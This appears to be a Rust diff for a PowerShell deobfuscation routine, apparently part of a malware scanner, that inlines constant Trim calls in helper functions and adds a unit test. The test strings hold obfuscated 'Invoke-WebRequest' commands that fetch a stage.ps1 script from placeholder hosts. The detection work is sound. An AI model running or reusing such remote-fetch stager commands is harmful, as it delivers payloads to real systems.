@@ -1095,6 +1095,14 @@ static PS_LITERAL_TRIM_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
 });
 
 #[allow(clippy::expect_used)]
+static PS_LITERAL_CONST_TRIM_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(
+        r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*(Trim(?:Start|End)?)\s*\(\s*((?:'(?:(?:'')|[^'])*')|(?:"(?:`.|[^"`$])*"))\s*\)"#,
+    )
+    .expect("ps literal const trim extractor body regex")
+});
+
+#[allow(clippy::expect_used)]
 static PS_LITERAL_SPLIT_INDEX_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
         r#"(?is)(?:\breturn\s+)?(?:\(\s*)?\$([A-Za-z_][A-Za-z0-9_]*)\s*(?:\)\s*)?\.\s*Split\s*\(\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\)\s*\[\s*\$([A-Za-z_][A-Za-z0-9_]*)\s*\]"#,
@@ -3740,7 +3748,38 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
 
     let mut out = text.to_string();
     for (name, params, body) in literal_substring_extractor_defs(text).into_iter().take(32) {
-        let Some(caps) = PS_LITERAL_TRIM_EXTRACTOR_BODY_RE.captures(&body) else {
+        if let Some(caps) = PS_LITERAL_TRIM_EXTRACTOR_BODY_RE.captures(&body) {
+            let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
+                continue;
+            };
+            let Some(kind) = caps
+                .get(2)
+                .and_then(|m| PsTrimKind::from_method(m.as_str()))
+            else {
+                continue;
+            };
+            let param_index = parse_ps_function_param_indices(&params);
+            let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
+                continue;
+            };
+            let chars_var = caps.get(3).map(|m| m.as_str());
+            let chars_idx = match chars_var {
+                Some(chars_var) => {
+                    match param_index.get(&chars_var.to_ascii_lowercase()).copied() {
+                        Some(idx) => Some(idx),
+                        None => continue,
+                    }
+                }
+                None => None,
+            };
+
+            out = inline_ps_literal_trim_calls(
+                &out, &name, value_idx, value_var, chars_idx, chars_var, kind,
+            );
+            continue;
+        }
+
+        let Some(caps) = PS_LITERAL_CONST_TRIM_EXTRACTOR_BODY_RE.captures(&body) else {
             continue;
         };
         let Some(value_var) = caps.get(1).map(|m| m.as_str()) else {
@@ -3752,22 +3791,22 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
         else {
             continue;
         };
+        let Some(chars) = caps
+            .get(3)
+            .and_then(|m| parse_complete_ps_static_quoted_literal(m.as_str()))
+        else {
+            continue;
+        };
+        if chars.is_empty() || chars.len() > 512 {
+            continue;
+        }
+
         let param_index = parse_ps_function_param_indices(&params);
         let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
             continue;
         };
-        let chars_var = caps.get(3).map(|m| m.as_str());
-        let chars_idx = match chars_var {
-            Some(chars_var) => match param_index.get(&chars_var.to_ascii_lowercase()).copied() {
-                Some(idx) => Some(idx),
-                None => continue,
-            },
-            None => None,
-        };
 
-        out = inline_ps_literal_trim_calls(
-            &out, &name, value_idx, value_var, chars_idx, chars_var, kind,
-        );
+        out = inline_ps_literal_const_trim_calls(&out, &name, value_idx, value_var, kind, &chars);
     }
     out
 }
@@ -5273,6 +5312,118 @@ fn inline_ps_named_literal_trim_call(
         return None;
     }
     Some((call_end, format!("'{}'", trimmed.replace('\'', "''"))))
+}
+
+fn inline_ps_literal_const_trim_calls(
+    text: &str,
+    name: &str,
+    value_idx: usize,
+    value_name: &str,
+    kind: PsTrimKind,
+    chars: &str,
+) -> String {
+    let lower = text.to_ascii_lowercase();
+    let needles = ps_literal_extractor_call_needles(text, name);
+    let bytes = text.as_bytes();
+    let mut matches = Vec::new();
+    let mut match_count = 0;
+
+    for needle in needles {
+        let mut search_from = 0;
+        while match_count < 128 {
+            let Some(rel) = lower[search_from..].find(&needle) else {
+                break;
+            };
+            let call_start = search_from + rel;
+            let end_name = call_start + needle.len();
+            let Some((replace_start, mut pos)) =
+                ps_literal_extractor_call_start_and_arg_pos(bytes, call_start, end_name)
+            else {
+                search_from = end_name;
+                continue;
+            };
+            let parenthesized = bytes.get(pos) == Some(&b'(');
+            if parenthesized {
+                pos = skip_ascii_ws(bytes, pos + 1);
+            }
+            if bytes.get(pos) == Some(&b'-') {
+                if let Some((call_end, replacement)) = inline_ps_named_literal_const_trim_call(
+                    text,
+                    pos,
+                    parenthesized,
+                    value_name,
+                    kind,
+                    chars,
+                ) {
+                    matches.push((replace_start, call_end, replacement));
+                    search_from = call_end;
+                    match_count += 1;
+                    continue;
+                }
+            }
+            let Some((value_end, value)) = parse_ps_static_quoted_literal(text, pos) else {
+                search_from = end_name;
+                continue;
+            };
+            let mut call_end = value_end;
+            if parenthesized {
+                let after = skip_ascii_ws(bytes, call_end);
+                if bytes.get(after) != Some(&b')') {
+                    search_from = value_end;
+                    continue;
+                }
+                call_end = after + 1;
+            }
+            if value_idx != 0 {
+                search_from = call_end;
+                continue;
+            }
+            let Some(replacement) = ps_literal_const_trim_replacement(&value, kind, chars) else {
+                search_from = call_end;
+                continue;
+            };
+            matches.push((replace_start, call_end, replacement));
+            search_from = call_end;
+            match_count += 1;
+        }
+    }
+
+    let mut out = text.to_string();
+    for (start, end, replacement) in matches.into_iter().rev() {
+        out.replace_range(start..end, &replacement);
+    }
+    out
+}
+
+fn inline_ps_named_literal_const_trim_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    kind: PsTrimKind,
+    chars: &str,
+) -> Option<(usize, String)> {
+    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 2)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_str();
+    Some((
+        call_end,
+        ps_literal_const_trim_replacement(value, kind, chars)?,
+    ))
+}
+
+fn ps_literal_const_trim_replacement(value: &str, kind: PsTrimKind, chars: &str) -> Option<String> {
+    if value.len() > 8192 || chars.is_empty() || chars.len() > 512 {
+        return None;
+    }
+    let trimmed = kind.apply_chars(value, chars);
+    if trimmed.len() > 8192 {
+        return None;
+    }
+    Some(format!("'{}'", trimmed.replace('\'', "''")))
 }
 
 fn inline_ps_literal_string_case_calls(
@@ -8763,6 +8914,23 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1~~~'
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1'"),
             "trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_constant_trim_extractor_call_is_rewritten() {
+        let text = r#"function Clean($value) {
+  return $value.Trim('~')
+}
+Clean '~~~Invoke-WebRequest -Uri https://ps-const-trim-extractor.example/stage.ps1~~~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-const-trim-extractor.example/stage.ps1'"
+            ),
+            "constant trim extractor call was not rewritten:\n{out}"
         );
     }
 
